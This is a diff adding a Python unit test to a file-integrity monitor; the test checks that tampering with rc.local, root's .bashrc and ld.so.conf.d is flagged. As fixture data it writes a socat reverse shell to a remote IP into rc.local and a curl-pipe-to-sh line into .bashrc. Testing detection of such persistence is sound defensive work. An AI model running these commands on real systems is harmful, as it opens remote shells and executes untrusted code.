@@ -10481,6 +10481,19 @@ class IntegrityFileTests(unittest.TestCase):
         self.assertIn(hook, found[0]["detail"].split("—")[1])
         self.assertNotIn(pkg_hook, found[0]["detail"].split("—")[1])
 
+    def test_boot_shell_and_library_persistence_is_watched(self):
+        """HZ#M3-6: /etc/rc.local, la inicialización de shells y ld.so.conf.d no se vigilaban."""
+        rc = self._file("rc_local", "rc.local", "#!/bin/sh\nexit 0\n")
+        bashrc = self._file("shell_init", "root/.bashrc", "alias ll='ls -l'\n")
+        base = self._seal()
+        self._file("rc_local", "rc.local", "#!/bin/sh\n/usr/bin/socat TCP:203.0.113.9:4444 EXEC:/bin/sh &\nexit 0\n")
+        self._file("shell_init", "root/.bashrc", "alias ll='ls -l'\n# comentario\n")
+        ld = self._file("ld_conf", "ld.so.conf.d/zz.conf", "/tmp/libs\n")
+        found = {f["target"]["path"]: f["sev"] for f in self._drift(base)}
+        self.assertEqual(found, {rc: "high", ld: "high"})  # el comentario en .bashrc no cuenta
+        self._file("shell_init", "root/.bashrc", "alias ll='ls -l'\ncurl -s http://x | sh\n")
+        self.assertEqual({f["target"]["path"]: f["sev"] for f in self._drift(base)}.get(bashrc), "high")
+
     def test_a_restore_never_quarantines_arx_itself(self):
         """Autorizar el pendiente de grupo de rc2 («cambió systemd_units») habría puesto en cuarentena las unidades de
         Arx: instaladas después de sellar, no estaban en la bóveda y parecían intrusas."""
